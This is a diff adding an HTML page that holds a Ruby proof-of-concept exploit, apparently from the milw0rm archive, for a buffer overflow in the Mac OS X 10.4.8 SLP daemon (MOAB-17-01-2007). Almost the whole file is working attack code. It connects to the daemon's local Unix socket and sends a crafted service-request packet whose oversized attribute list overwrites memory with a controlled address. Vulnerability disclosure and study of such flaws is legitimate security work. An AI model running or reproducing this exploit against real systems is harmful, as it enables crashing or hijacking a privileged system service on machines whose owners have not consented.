@@ -1,0 +1,30 @@
+<html><head><title>Mac OS X 10.4.8 SLP Daemon Service Registration Buffer Overflow PoC</title></head><pre>#!/usr/bin/ruby
+# (c) Copyright 2006 Lance M. Havok	  &lt;lmh [at] info-pull.com&gt;
+#    			           Kevin Finisterre &lt;kf_lists [at] digitalmunition.com&gt;
+# All pwnage reserved.
+#
+# Proof of concept for MOAB-17-01-2007
+# http://projects.info-pull.com/moab/MOAB-17-01-2007.html
+#
+# Originally reported to Apple by Kevin, on 08/02/2006.
+
+require 'socket'
+
+target_path = (ARGV[0] || '/var/run/slp_ipc')
+slp_socket	= UNIXSocket.open(target_path)
+
+payload =   (&quot;\x58&quot; * 506)
+payload &lt;&lt;  [0xdeadbeef].pack(&quot;V&quot;)            # ...it expects a valid mem. address (ex. 0xbffff398)
+
+stream  = &quot;\x01&quot;                            + # SrvRqst = 1
+          &quot;\x00\x13&quot;                        + # Length of remaining fields? (up to attr-list)
+          &quot;\x04\x00\x00\x00\x00\x00\x00&quot;    +
+          &quot;\x00\x02\x00\x00&quot;                + # length of scope-list string
+          &quot;\x78\x78&quot;                        + # &lt;scope-list&gt;
+          &quot;\xff\x03\x00\x00&quot;                + # length of attr-list string 0x3ff = 1023 in hex.
+          (payload)                           # &lt;attr-list&gt;
+
+slp_socket.write stream
+slp_socket.close
+
+# milw0rm.com [2007-01-18]</pre></html>
